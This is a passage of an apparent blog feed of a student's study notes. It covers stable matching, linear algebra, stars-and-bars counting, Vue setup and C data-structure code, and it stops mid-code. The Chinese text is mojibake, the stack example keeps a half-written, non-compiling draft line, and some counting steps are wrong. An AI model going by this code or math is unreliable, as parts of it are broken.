href="https://www.youtube.com/watch?v=0m_YW1zVs-Q">youtube</a></p><p>æ³¨æ„ï¼ŒæŠŠä¸Šæ–‡çš„å‰ç«¯åç«¯ç»„æˆ‘ç§°å‘¼ä¸ºA, B ç»„ï¼Œå…¶å®ä¹Ÿå¯¹åº”è§†é¢‘é‡Œçš„MALESå’ŒFEMALESä¸¤ä¸ªç»„ã€‚</p><p>Aç»„æ˜¯ä»åå¥½çš„é«˜åˆ°ä½é€‰ï¼ŒBç»„æ˜¯ä»åå¥½çš„ä½åˆ°é«˜é€‰ã€‚</p><p>Aç»„ä¼˜å…ˆé€‰äººï¼Œä¸€è½®é€‰å®Œï¼ˆä¸æ±‚å…¨éƒ¨é…å¯¹ï¼‰ï¼Œå› ä¸ºæœ‰å¯èƒ½åè€…è¢«å‰è€…æŠ¢äº†ç¬¬ä¸€åå¥½ï¼Œå› æ­¤åœ¨ç¬¬äºŒè½®ã€ç¬¬ä¸‰è½®ç­‰å†åŒ¹é…ã€‚</p><p><img src="/2025/02/19/COMP9101/wk1-lec/2025-02-26-14-38-58.png" alt></p><p><img src="/2025/02/19/COMP9101/wk1-lec/2025-02-26-14-40-07.png" alt></p><h2 id="å…³äºæ­¤ç®—æ³•æ›´æœ‰åˆ©äºè¿½æ±‚æ–¹ï¼Œè¢«è¿½æ±‚æ–¹å°‘åˆ©"><a href="#å…³äºæ­¤ç®—æ³•æ›´æœ‰åˆ©äºè¿½æ±‚æ–¹ï¼Œè¢«è¿½æ±‚æ–¹å°‘åˆ©" class="headerlink" title="å…³äºæ­¤ç®—æ³•æ›´æœ‰åˆ©äºè¿½æ±‚æ–¹ï¼Œè¢«è¿½æ±‚æ–¹å°‘åˆ©"></a>å…³äºæ­¤ç®—æ³•æ›´æœ‰åˆ©äºè¿½æ±‚æ–¹ï¼Œè¢«è¿½æ±‚æ–¹å°‘åˆ©</h2><p>Thatâ€™s right, the algorithm is always unfair for one party because it is not symmetric. It is designed to give the â€œproposing partyâ€ the best possible stable match, and the â€œaccepting partyâ€ potentially a worse, but still stable match. </p><p>But the goal of the algorithm is to generate a stable match, and thatâ€™s what it does.</p><p>In fact, one can prove that the Gale-Shapley algorithm is optimal for the party proposing and pessimal (i.e. least favourable) for the party rejecting. This is actually a key fact about the algorithm that allows us to find when there is a unique stable matching!</p><p>They mean that a backend engineer will only switch their pairing if they are presented with a frontend engineer that they prefer more. The sequence of frontend engineers that a particular backend engineer is pair is non-decreasing in preference over time and will eventually become constant.</p><p>Say a backend engineer is first offered with their 6th preference, then they accept by default. If we then offer the following front engineers with numbers representing preferences: (10, 4, 7, 6, 5, 11, 2, 3), then their accepted engineer sequence would be (6, 6, 4, 4, 4, 4,4, 2, 2). This is non decreasing in preference.</p><h1 id="puzzle-1"><a href="#puzzle-1" class="headerlink" title="puzzle"></a>puzzle</h1><p>On a circular highway there are n petrol stations, unevenly spaced, each containing a different quantity of petrol. It is known that the total amount of petrol from all stations is exactly enough to go around the highway once.</p><p>You want to start at a petrol station, take all its fuel, and drive clockwise around the highway once. Each time you reach a petrol station, you will take all its fuel too.1 The only problem is the possibility that you might run out of fuel before reaching the next petrol station!</p><p>Prove that there is always at least one starting petrol station to make it around the highway.</p>]]></content>
      
      
      <categories>
          
          <category> COMP9101 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>LA1-Geometry</title>
      <link href="/2025/01/05/Math/LA1-Geometry/"/>
      <url>/2025/01/05/Math/LA1-Geometry/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#how-to-use-matrices-to-the-simultaneous-equations">how to use matrices to the simultaneous equations</a></li><li><a href="#endbmatrix">\end{bmatrix}</a></li><li><a href="#endbmatrix-1">\end{bmatrix}</a><ul><li><a href="#row-picture">Row Picture</a></li><li><a href="#column-picture">Column Picture</a></li></ul></li><li><a href="#how-about-three-elements">how about three elements</a></li><li><a href="#a">A</a></li><li><a href="#b">b</a><ul><li><a href="#row-picture-1">Row Picture</a></li><li><a href="#column-picture-1">Column picture</a></li></ul></li><li><a href="#question-about-the-existence-of-every-b">question about the existence of every b</a></li></ul><h1 id="how-to-use-matrices-to-the-simultaneous-equations"><a href="#how-to-use-matrices-to-the-simultaneous-equations" class="headerlink" title="how to use matrices to the simultaneous equations"></a>how to use matrices to the simultaneous equations</h1><script type="math/tex; mode=display">\begin{cases}2x - y &= 0, \\-x + 2y &= 3.\end{cases}</script><p>What is the coefficient matrix?</p><script type="math/tex; mode=display">A \cdot B =\begin{bmatrix}a_{11} & a_{12} \\a_{21} & a_{22}\end{bmatrix}\cdot\begin{bmatrix}b_{11} & b_{12} \\b_{21} & b_{22}\end{bmatrix}=\begin{bmatrix}a_{11}b_{11} + a_{12}b_{21} & a_{11}b_{12} + a_{12}b_{22} \\a_{21}b_{11} + a_{22}b_{21} & a_{21}b_{12} + a_{22}b_{22}\end{bmatrix}</script><p>Hence </p><script type="math/tex; mode=display">\begin{bmatrix}2 & -1 \\-1 & 2\end{bmatrix}\cdot\begin{bmatrix}x \\y\end{bmatrix}=\begin{bmatrix}0 \\3\end{bmatrix}</script><p>Itâ€™s called </p><script type="math/tex; mode=display">Ax=b</script><h2 id="Row-Picture"><a href="#Row-Picture" class="headerlink" title="Row Picture"></a>Row Picture</h2><p><img src="/2025/01/05/Math/LA1-Geometry/2025-01-05-08-47-48.png" alt></p><h2 id="Column-Picture"><a href="#Column-Picture" class="headerlink" title="Column Picture"></a>Column Picture</h2><script type="math/tex; mode=display">x\cdot\begin{bmatrix}2 \\-1\end{bmatrix}+y\cdot\begin{bmatrix}-1 \\2\end{bmatrix}=\begin{bmatrix}0 \\3\end{bmatrix}</script><p>This is the linear combination of columns.</p><p><img src="/2025/01/05/Math/LA1-Geometry/2025-01-05-08-52-30.png" alt></p><p><img src="/2025/01/05/Math/LA1-Geometry/2025-01-05-08-55-46.png" alt></p><h1 id="how-about-three-elements"><a href="#how-about-three-elements" class="headerlink" title="how about three elements"></a>how about three elements</h1><p>Just simply combine the x and y, we would gain $x=1 \quad and \quad y=2$.</p><script type="math/tex; mode=display">\begin{cases}2x - y &= 0, \\-x + 2y - z &= -1 \\-3y + 4z &= 4\end{cases}</script><script type="math/tex; mode=display">A=\begin{bmatrix}2 & -1 & 0\\-1 & 2 & -1\\0 & -3 & 4\end{bmatrix}</script><script type="math/tex; mode=display">b=\begin{bmatrix}0\\-1\\4\end{bmatrix}</script><p>Hence</p><script type="math/tex; mode=display">\begin{bmatrix}2 & -1 & 0\\-1 & 2 & -1\\0 & -3 & 4\end{bmatrix}\cdot\begin{bmatrix}x\\y\\z\end{bmatrix}=\begin{bmatrix}0\\-1\\4\end{bmatrix}</script><h2 id="Row-Picture-1"><a href="#Row-Picture-1" class="headerlink" title="Row Picture"></a>Row Picture</h2><p>seperately let two of the elements be equal to zero, then get the third elementâ€™s coordinate.</p><p><img src="/2025/01/05/Math/LA1-Geometry/2025-01-05-09-05-20.png" alt></p><h2 id="Column-picture"><a href="#Column-picture" class="headerlink" title="Column picture"></a>Column picture</h2><script type="math/tex; mode=display">x\cdot\begin{bmatrix}2 \\-1 \\0\end{bmatrix}+y\cdot\begin{bmatrix}-1 \\2 \\-3\end{bmatrix}+z\cdot\begin{bmatrix}0 \\-1 \\4\end{bmatrix}=\begin{bmatrix}0 \\-1 \\4\end{bmatrix}</script><p><img src="/2025/01/05/Math/LA1-Geometry/2025-01-05-09-18-40.png" alt></p><p>These equations ask us to combine the three vectors in the coordinate. Eventually we got <code>x=0 y=0 z=1</code></p><h1 id="question-about-the-existence-of-every-b"><a href="#question-about-the-existence-of-every-b" class="headerlink" title="question about the existence of every b"></a>question about the existence of every b</h1><p>Can I solve Ax=b for every b?</p><p>Do the linear combs of the columns fill 3-D space?</p><p>For the matrix, the answer is YES. But if these b forming in the same plane, you will get the same plain as the result.</p><p><img src="/2025/01/05/Math/LA1-Geometry/2025-01-05-09-32-42.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>LinearAlgebra</title>
      <link href="/2025/01/05/Math/LinearAlgebra/"/>
      <url>/2025/01/05/Math/LinearAlgebra/</url>
      
        <content type="html"><![CDATA[<p>Good noon, everybody!</p><p>Because recently I am on my summer vacation for whole three months, while Chrismas and New Year (I guess you may know my hemisphere).</p><p>The first one month was so boring, I just traveled every corner in my city. For better meaning of the left time of vacation, I decided to learn Linear Algebra in MIT platform. In the meanwhile, I selected all AI-related curriculums of all the three terms in 2025. I just want to figure out all the problem and details of AI.</p><p>This is the website owned by MIT, link: <a href="https://web.mit.edu/18.06/www/">MASSACHUSETTS INSTITUTE OF TECHNOLOGY</a>, lecturer is <code>Gilbert Strang</code>. Relevent exam and notes is on <a href="https://github.com/mitmath/1806">github</a>.</p><p>Just clone the repository, and start a local jupternotebook server, and there are a lot of code here to run the computation of matrix.</p><p>I suggest me to learn something about numpy and metaploit.</p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Baffle_Method</title>
      <link href="/2024/12/11/Math/Baffle-Method/"/>
      <url>/2024/12/11/Math/Baffle-Method/</url>
      
        <content type="html"><![CDATA[<p>Refer to <a href="https://senranja.github.io/2024/11/18/Math/Combinatorics/">Combinatorics</a> and <a href="https://senranja.github.io/2024/11/18/Math/Probability/">Probability</a>, Baffle_Method occured in <strong>Tutorial 8</strong>.</p><h1 id="Combinations-and-Permutations"><a href="#Combinations-and-Permutations" class="headerlink" title="Combinations and Permutations"></a>Combinations and Permutations</h1><script type="math/tex; mode=display">(n)_r = \frac{n!}{(n-r)!}</script><p>and </p><script type="math/tex; mode=display">\binom{n}{r} = \frac{n!}{(n-r)!r!}</script><p>The number of ways to select k items from a set of n items:</p><div class="table-container"><table><thead><tr><th>With Replacement</th><th>Order Matters</th><th>Formula</th></tr></thead><tbody><tr><td>Yes</td><td>Yes</td><td>$n^k$</td></tr><tr><td>No</td><td>Yes</td><td>$(n)_k$</td></tr><tr><td>No</td><td>No</td><td>$\binom{n}{k}$</td></tr><tr><td>Yes</td><td>No</td><td>$\binom{n+k-1}{k}$</td></tr></tbody></table></div><h1 id="Question"><a href="#Question" class="headerlink" title="Question"></a><strong>Question</strong></h1><p>a. How many ways can 20 identical balloons and 32 distinct lollipops be distributed among 4 children? </p><p>b. What if each child gets at least 1 ball and exactly 8 lollipops?</p><h1 id="Answer"><a href="#Answer" class="headerlink" title="Answer"></a><strong>Answer</strong></h1><p><code>identical</code> means totally the same, so that we donâ€™t distinguish any of them.</p><p>In this question, we focus on Baffle Method, so we focus only on the identical 20 balloons.</p><h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a><strong>Analysis</strong></h1><h2 id="a"><a href="#a" class="headerlink" title="a"></a>a</h2><p>a. 20 identical balloons would be distributed to 4 children. May someone gain 0 or 20 balloons.</p><p>The question is a category question. Itâ€™s not a permutation or comborics problem. We need to divide the 20 balloons into 4 categories, with order of the item numbers.</p><p>For example, list a small number:</p><p><strong>Four</strong> identical balloons, distribute them to <strong>3 different children</strong>.</p><p>There are some solutions:</p><pre><code>0 0 40 4 04 0 01 0 31 2 1...</code></pre><p>Obviously itâ€™s a category problem. We need to divide rather not a pure permutate or combination.</p><p>Imagine the baffles and four balloons.</p><p><img src="/2024/12/11/Math/Baffle-Method/2024-12-11-08-26-22.png" alt></p><p>Four different children, means three baffles. We regard the baffles as the balloons. So there are six positions, and there should be two baffles in them.</p><p>Then we talk about the bafflesâ€™s combinations so that we could know how many conditions that the baffles could divide the balloons.</p><p>$\binom{4+3-1}{2} = \binom{6}{2}$</p><p>Yes! We have solved four balloons!</p><p>Then we look back to the 20 balloons:</p><p>$\binom{20+4-1}{3} = \binom{23}{3}$</p><p>Imagine there are totally 23 positions, and we choose 3 positions as baffles in them.</p><h2 id="b"><a href="#b" class="headerlink" title="b"></a>b</h2><p>b. What if each child gets at least 1 ball and exactly 8 lollipops?</p><p>We think of the three different children and four balloons firstly.</p><p>We found we can only confine the baffle positions into the intervals of the four balloons, so that every child could gain at least one balloon.</p><p><img src="/2024/12/11/Math/Baffle-Method/2024-12-11-08-39-15.png" alt></p><p>Hence $\binom{4-1}{3} = \binom{3}{3}$</p><p>The same to the b question, we gain $\binom{20-1}{3} = \binom{19}{3}$.</p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vue</title>
      <link href="/2024/12/11/GUI/vue/"/>
      <url>/2024/12/11/GUI/vue/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#simply-use-vue-to-build-front-end">Simply use VUE to build front-end</a></li><li><a href="#download-the-lastest-nodejs">download the lastest node.js</a></li><li><a href="#create-vue-framework">create vue framework</a></li><li><a href="#add-element-plus">add Element-Plus</a></li></ul><h1 id="Simply-use-VUE-to-build-front-end"><a href="#Simply-use-VUE-to-build-front-end" class="headerlink" title="Simply use VUE to build front-end"></a>Simply use VUE to build front-end</h1><p>Althought I wrote a complete front-end project of an exam system, but I forget most knowledge about VUE because I donâ€™t use it very often after I arrived in Sydney. Yesterday a friend asked me to make a simple website, I just thought maybe I can simply record some steps to build the application.</p><h1 id="download-the-lastest-node-js"><a href="#download-the-lastest-node-js" class="headerlink" title="download the lastest node.js"></a>download the lastest node.js</h1><p>I work on windows, and I download the pre-built binaries from the hyperlink here: <a href="https://nodejs.org/en/download/prebuilt-binaries">npm prebuilt-binaries</a></p><p>Download and unzip it, then I gained binaries. Just add the path into the hostâ€™s environment, then check <code>npm -v</code> and <code>node -v</code>.</p><p>If you want to upgrade npm and node, just uninstall npm at the control panel of the windows. Then download the lastest binaries from the nodejsâ€™ offcial website. Nodejs contains both npm and node.</p><h1 id="create-vue-framework"><a href="#create-vue-framework" class="headerlink" title="create vue framework"></a>create vue framework</h1><p>please refer to <code>https://cn.vitejs.dev/guide/</code> for more details, which is VUEâ€™s offcial website.</p><p>Use the command below to create vue.</p><pre><code>npm create vite@latest my-vue-app -- --template vue</code></pre><p><img src="/2024/12/11/GUI/vue/2024-12-11-07-57-28.png" alt></p><h1 id="add-Element-Plus"><a href="#add-Element-Plus" class="headerlink" title="add Element-Plus"></a>add Element-Plus</h1><p>refer to official website: <code>https://element-plus.org/zh-CN/</code>.</p><pre><code>npm install element-plus --save</code></pre><p>Then revise the original <strong>main.js</strong>, so that ensure you can use ES directly and correctly.</p><p>main.js</p><pre><code class="lang-js">import &#123; createApp &#125; from &#39;vue&#39;import ElementPlus from &#39;element-plus&#39;;import &#39;element-plus/dist/index.css&#39;; // ç¡®ä¿å¼•å…¥ Element Plus çš„æ ·å¼import App from &#39;./App.vue&#39;const app = createApp(App); // åˆ›å»ºåº”ç”¨å®ä¾‹app.use(ElementPlus); // ä½¿ç”¨ Element Plus æ’ä»¶app.mount(&#39;#app&#39;); // æŒ‚è½½åº”ç”¨åˆ° DOM</code></pre>]]></content>
      
      
      <categories>
          
          <category> GUI </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DepthFirstSearch</title>
      <link href="/2024/11/22/Algorithm/DepthFirstSearch/"/>
      <url>/2024/11/22/Algorithm/DepthFirstSearch/</url>
      
        <content type="html"><![CDATA[<p>redfer to <a href="https://github.com/sheisc/COMP9024/tree/main/Tutorials/Week5">UNSW COMP9024</a></p><ul><li><a href="#recursive">recursive</a></li><li><a href="#non-recursive">non-recursive</a></li></ul><p>Note itâ€™s graph, not only tree!</p><h1 id="recursive"><a href="#recursive" class="headerlink" title="recursive"></a>recursive</h1><pre><code class="lang-C">static void DepthFirstSearch(struct Graph *pGraph, long u, int *visited) &#123;    visited[u] = 1;    printf(&quot;visiting %s\n&quot;, pGraph-&gt;pNodes[u].name);    // recursively visit the adjacent nodes of u, if they have not been visited yet    for(long v = 0; v &lt; pGraph-&gt;n; v++) &#123;        if (MatrixElement(pGraph, u, v) == CONNECTED &amp;&amp; !visited[v]) &#123;            DepthFirstSearch(pGraph, v, visited);        &#125;    &#125;&#125;void RecursiveDFS(struct Graph *pGraph, long u) &#123;    // Note visited is an array, not only an int    int *visited = (int *) malloc(pGraph-&gt;n * sizeof(int));    //memset(visited, 0, sizeof(int) * pGraph-&gt;n);    for (long v = 0; v &lt; pGraph-&gt;n; v++) &#123;        visited[v] = 0;    &#125;    DepthFirstSearch(pGraph, u, visited);    printf(&quot;\n&quot;);    free(visited);&#125;</code></pre><p>For example, search from node 3.</p><p><img src="/2024/11/22/Algorithm/DepthFirstSearch/2024-11-22-16-09-17.png" alt></p><h1 id="non-recursive"><a href="#non-recursive" class="headerlink" title="non-recursive"></a>non-recursive</h1><p>if use non-recursive algorithm, we must use a stack.</p><pre><code class="lang-C">#if 1/*    Please complete the code in Q1-Q5:    Q1:  create a data stack    Q2:  push u onto the data stack    Q3:  test whether the data stack is empty    Q4:  push v onto the data stack    Q5:  free the heap space occupied by the data stack  */void NonRecursiveDFS(struct Graph *pGraph, long u) &#123;    assert(IsLegalNodeNum(pGraph, u));    static long cnt = 0;    int *visited = (int *) malloc(sizeof(int) * pGraph-&gt;n);    // struct Stack *pStack = ______Q1______;    struct Stack *pStack = createStack();    assert(visited &amp;&amp; pStack);    for (long i = 0; i &lt; pGraph-&gt;n; i++) &#123;        visited[i] = 0;    &#125;    printf(&quot;\n\t\t\t\tpush %ld\n&quot;, u);    // ______Q2______;    StackPush(pStack, u);    // while (______Q3______) &#123;    while (!StackIsEmpty(pStack)) &#123;        printf(&quot;\n&quot;);        // If visited the node, just Pop it!        PrintStack(pStack);        STACK_ITEM_T curNodeId = StackPop(pStack);        printf(&quot;\t\t\t\tpop %ld\n&quot;, curNodeId);        if (!visited[curNodeId]) &#123;            visited[curNodeId] = 1;            printf(&quot;\t\t\t\t\t\tvisiting %s\n&quot;, pGraph-&gt;pNodes[curNodeId].name);            // Put all the adjancient node into the stack            for (long v = pGraph-&gt;n - 1; v &gt;= 0; v--) &#123;                if (MatrixElement(pGraph, curNodeId, v) == CONNECTED &amp;&amp; !visited[v]) &#123;                    // ______Q4______;                    StackPush(pStack, v);                    printf(&quot;\t\t\t\tpush %ld\n&quot;, v);                &#125;            &#125;                    &#125;    &#125;    printf(&quot;\n&quot;);    // ______Q5______;    StackRelease(pStack);    free(visited);    &#125;#endif</code></pre>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ParseTree</title>
      <link href="/2024/11/22/Algorithm/ParseTree/"/>
      <url>/2024/11/22/Algorithm/ParseTree/</url>
      
        <content type="html"><![CDATA[<p>refer to <a href="https://github.com/sheisc/COMP9024/tree/main/Tutorials/Week4"></a></p><ul><li><a href="#parse-tree">Parse Tree</a></li><li><a href="#9000--24">9000 + 24</a></li><li><a href="#9000--64">9000 + (6*4)</a></li><li><a href="#parse-tree-operator">Parse Tree Operator</a><ul><li><a href="#primaryexpression">PrimaryExpression</a></li><li><a href="#multiplicativeexpression">MultiplicativeExpression</a></li><li><a href="#additiveexpression">AdditiveExpression</a></li><li><a href="#arithmetic-expression">Arithmetic expression</a></li></ul></li></ul><h1 id="Parse-Tree"><a href="#Parse-Tree" class="headerlink" title="Parse Tree"></a>Parse Tree</h1><p><img src="/2024/11/22/Algorithm/ParseTree/2024-11-22-15-51-04.png" alt></p><h1 id="9000-24"><a href="#9000-24" class="headerlink" title="9000 + 24"></a>9000 + 24</h1><p><img src="/2024/11/22/Algorithm/ParseTree/2024-11-22-15-50-03.png" alt></p><h1 id="9000-6-4"><a href="#9000-6-4" class="headerlink" title="9000 + (6*4)"></a>9000 + (6*4)</h1><p><img src="/2024/11/22/Algorithm/ParseTree/2024-11-22-15-50-17.png" alt></p><h1 id="Parse-Tree-Operator"><a href="#Parse-Tree-Operator" class="headerlink" title="Parse Tree Operator"></a>Parse Tree Operator</h1><h2 id="PrimaryExpression"><a href="#PrimaryExpression" class="headerlink" title="PrimaryExpression"></a>PrimaryExpression</h2><pre><code>PrimaryExpression:    NUM    (Expression)</code></pre><h2 id="MultiplicativeExpression"><a href="#MultiplicativeExpression" class="headerlink" title="MultiplicativeExpression"></a>MultiplicativeExpression</h2><pre><code>MultiplicativeExpression:        PrimaryExpression        PrimaryExpression  mop PrimaryExpression  ...   mop PrimaryExpression  // multiplicative operatormop:            *              / </code></pre><h2 id="AdditiveExpression"><a href="#AdditiveExpression" class="headerlink" title="AdditiveExpression"></a>AdditiveExpression</h2><pre><code>AdditiveExpression:      MultiplicativeExpression      MultiplicativeExpression  aop MultiplicativeExpression  ...   aop MultiplicativeExpression  // additive operatoraop:            +              -</code></pre><h2 id="Arithmetic-expression"><a href="#Arithmetic-expression" class="headerlink" title="Arithmetic expression"></a>Arithmetic expression</h2><pre><code>Expression:      AdditiveExpression</code></pre>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Stack</title>
      <link href="/2024/11/22/Algorithm/Stack/"/>
      <url>/2024/11/22/Algorithm/Stack/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#base-conversion">Base conversion</a></li><li><a href="#enlarge-the-size">Enlarge the size</a></li></ul><p>Refer to <a href="https://github.com/sheisc/COMP9024/tree/main/Tutorials/Week3">UNSW COMP9024</a></p><h1 id="Base-conversion"><a href="#Base-conversion" class="headerlink" title="Base conversion"></a>Base conversion</h1><pre><code class="lang-C">typedef long STACK_ITEM_T;void PrintInteger(STACK_ITEM_T x, int base) &#123;    struct Stack *pStack = CreateStack();    int r;    x = (x &gt;= 0 ? x : -x);    base = (base &gt;= 0 ? base: -base);    printf(&quot;------------- x = %ld, base = %d -------------\n\n&quot;, (long) x, base);    // push the remainders onto the stack    do &#123;        r = x % base;        x = x / base;        printf(&quot;push %d\n&quot;, r);        StackPush(pStack, r);    &#125; while (x != 0);    printf(&quot;\n\nAfter popping (First In Last Out):\n\n&quot;);    PrintPrefix(base);    // output the remainders in the FILO order    while(!StackIsEmpty(pStack)) &#123;        r = StackPop(pStack);        // see https://www.asciitable.com/        // IF-ELSE just want to output A==10, B==11, ... F==15        // LIFO is OK, Last digit put into the stack is the highest digit of other Base.        if (r &lt;= 9) &#123;            // 1 --&gt; &#39;1&#39; (0x31, 49); ...            // 1 + 48 == 49            printf(&quot;%c&quot;, r + 48);        &#125; else if (r &lt;= 15) &#123;            // 10 --&gt; &#39;A&#39; (0x41, 65);  11 --&gt; &#39;B&#39;, ...            // 10 + 55 == 65            printf(&quot;%c&quot;, r + 55);        &#125; else &#123;            // unknown base            printf(&quot;?&quot;);        &#125;    &#125;    ReleaseStack(pStack);    printf(&quot;\n&quot;);&#125;</code></pre><pre><code>Week3$ makeWeek3$ ./main------------- x = 20249024, base = 10 -------------push 4push 2push 0push 9push 4push 2push 0push 2After popping (First In Last Out):20249024------------- x = 20249024, base = 16 -------------push 0push 12push 9push 15push 4push 3push 1After popping (First In Last Out):0x134F9C0------------- x = 20249024, base = 8 -------------push 0push 0push 7push 4push 7push 1push 5push 1push 1After popping (First In Last Out):0o115174700------------- x = 20249024, base = 2 -------------push 0push 0push 0push 0push 0push 0push 1push 1push 1push 0push 0push 1push 1push 1push 1push 1push 0push 0push 1push 0push 1push 1push 0push 0push 1After popping (First In Last Out):0b1001101001111100111000000</code></pre><h1 id="Enlarge-the-size"><a href="#Enlarge-the-size" class="headerlink" title="Enlarge the size"></a>Enlarge the size</h1><pre><code class="lang-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;assert.h&gt;#include &lt;string.h&gt;#include &quot;Stack.h&quot;// number of items, not in bytes#define INITIAL_STACK_SIZE   64// the top position when a stack is empty#define TOP_POS_FOR_EMPTY_STACK  -1// The type defintion of our Stackstruct Stack &#123;    // the current capacity size of a stack, in the number of items, not in bytes    long size;    // the stack top position    long top;    // pItems points to an array dynamically allocated in heap    STACK_ITEM_T *pItems;&#125;;// Test whether the stack is fullstatic int StackIsFull(struct Stack *pStack) &#123;    return pStack-&gt;top == pStack-&gt;size - 1;    &#125;// Test whether the stack is emptyint StackIsEmpty(struct Stack *pStack) &#123;    return pStack-&gt;top == TOP_POS_FOR_EMPTY_STACK;&#125;// Create a stackstruct Stack *CreateStack(void) &#123;    struct Stack *pStack;    STACK_ITEM_T *pItems;    //printf(&quot;sizeof(STACK_ITEM_T) == %ld\n&quot;, sizeof(STACK_ITEM_T));    pStack = (struct Stack *) malloc(sizeof(struct Stack));    pItems = (STACK_ITEM_T *) malloc(sizeof(STACK_ITEM_T) * INITIAL_STACK_SIZE);    assert(pStack &amp;&amp; pItems);    pStack-&gt;size = INITIAL_STACK_SIZE;        pStack-&gt;top = TOP_POS_FOR_EMPTY_STACK;    pStack-&gt;pItems = pItems;    return pStack;&#125;// Release the heap spacevoid ReleaseStack(struct Stack *pStack) &#123;    if (pStack) &#123;        free(pStack-&gt;pItems);        free(pStack);    &#125;&#125;// Push an item onto/at the top of the stack void StackPush(struct Stack *pStack, STACK_ITEM_T item) &#123;    if (StackIsFull(pStack)) &#123;        // if the Stack is not enough, it would increase its size automatically        /*            Please complete the following code in Q1-Q5.            Q1. call malloc() to allocate enough bytes of heap memory,                and save the return value in a pointer variable named as newItems                       Q2. call memcpy() to copy the items pointed to by pStack-&gt;pItems                 to the heap memory pointed to by newItems                For help, please type &#39;man memcpy&#39; in the command line.                $ man memcpy            Q3. call free() to release the unused heap memory            Q4. double the capacity size of the stack            Q5. let pStack-&gt;pItems point to the heap space allocated in Q1            You need to echo these questions in our weekly Quiz.            Our tutors will NOT answer these questions in the tutorial.            To test the code you have completed, you can set INITIAL_STACK_SIZE to be 2 (line 8 in Stack.c)         */        // Double the capacity of the stack                // Q1. ___________________        STACK_ITEM_T *newItems = (STACK_ITEM_T *) malloc(pStack-&gt;size * 2 * sizeof(STACK_ITEM_T));        // Q2. ___________________        memcpy(newIte)        // Q3. ___________________        // Q4. ___________________        // Q5. ___________________         // Q1. Allocate memory for the new stack items array with double the size        long newSize = pStack-&gt;size * 2; // Double the current size        STACK_ITEM_T *newItems = (STACK_ITEM_T *)malloc(sizeof(STACK_ITEM_T) * newSize);        assert(newItems); // Ensure memory allocation was successful        // Q2. Copy the old items to the new items array        // memcpy would copy the second parameter context into the parameter        memcpy(newItems, pStack-&gt;pItems, sizeof(STACK_ITEM_T) * pStack-&gt;size);        // Q3. Free the old items array        free(pStack-&gt;pItems);        // Q4. Update the stack&#39;s size to the new size        pStack-&gt;size *=2;        // Q5. Point to the new items array        pStack-&gt;pItems = newItems;    &#125;    // Now the stack is not full. Let us do the push operation.    pStack-&gt;top++;    pStack-&gt;pItems[pStack-&gt;top] = item;&#125;// Pop the top item from the stackSTACK_ITEM_T StackPop(struct Stack *pStack) &#123;    assert(!StackIsEmpty(pStack));    STACK_ITEM_T item = pStack-&gt;pItems[pStack-&gt;top];    pStack-&gt;top--;    return item;&#125;// Peek the top item without poppingSTACK_ITEM_T StackPeek(struct Stack *pStack) &#123;    assert(!StackIsEmpty(pStack));    STACK_ITEM_T item = pStack-&gt;pItems[pStack-&gt;top];    return item;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BubbleSort</title>
      <link href="/2024/11/22/Algorithm/BubbleSort/"/>
      <url>/2024/11/22/Algorithm/BubbleSort/</url>
      
        <content type="html"><![CDATA[<p>The raw code refers to: <a href="https://github.com/sheisc/COMP9024/tree/main/Tutorials/Week2">UNSW COMP9024</a></p><pre><code class="lang-C">#include &lt;stdio.h&gt;/*    Swap the values of the two integer variables pointed to by pa and pb, respectively.   */void Swap(int *pa, int *pb) &#123;    int tmp = *pa;    *pa = *pb;    *pb = tmp;&#125;/*  Why Swap2(int a, int b) doesn&#39;t work?    Only the values of the two parameters a and b are swapped. */void Swap2(int a, int b) &#123;    printf(&quot;a = %d, b = %d\n&quot;, a, b);    int tmp = a;    a = b;    b = tmp;    printf(&quot;a = %d, b = %d\n&quot;, a, b);&#125;/*    void PrintArray(int *ptr, int n);        Print the values of the n integer variables pointed to by an pointer ptr:            ptr[0],  ptr[1],    ptr[2],    ...,  ptr[n-1]        or             *ptr,   *(ptr+1),  *(ptr+2),   ...,  *(ptr + n -1) */void PrintArray(int *ptr, int n) &#123;    for (int i = 0; i &lt; n; i++) &#123;        printf(&quot;%d &quot;, ptr[i]);    &#125;    printf(&quot;\n&quot;);&#125;/*    Bubble sort the n numbers pointed to by ptr.    The elements are sorted in ascending order (from the least to the greatest). */void BubbleSort(int *ptr, int n) &#123;    /*        1. iMax represents the max value of i in a pass              (in the following &quot;if (ptr[i] &gt; ptr[i+1])&quot;)        2. (n-1) passes needed in Bubble Sort     */    for (int iMax = n - 2; iMax &gt;= 0; iMax--) &#123; // (n-1) passes        // printf() is quite useful in observing the behavior of a program        printf(&quot;............... iMax = %d ...............\n\n&quot;, iMax);        PrintArray(ptr, iMax + 2);        printf(&quot;\n\n&quot;);        // i is in [0, iMax] in the current pass        for (int i = 0; i &lt;= iMax; i++) &#123;            if (ptr[i] &gt; ptr[i+1]) &#123;                Swap(ptr + i, ptr + i + 1);                printf(&quot;After swapping ptr[%d] and ptr[%d]:\n&quot;, i, i+1);                PrintArray(ptr, iMax + 2);                printf(&quot;\n&quot;);            &#125;        &#125;           &#125;&#125;#if 1int IsLess(int a, int b) &#123;    return a &lt; b;&#125;int IsLarger(int a, int b) &#123;    return a &gt; b;&#125;// Define a function pointer type, which points to a functiontypedef int (*ComparatorFuncPtr)(int, int);void BubbleSort2(int *ptr, int n, ComparatorFuncPtr compare) &#123;    for (int iMax = n - 2; iMax &gt;= 0; iMax--) &#123;        // for (int i = 0; 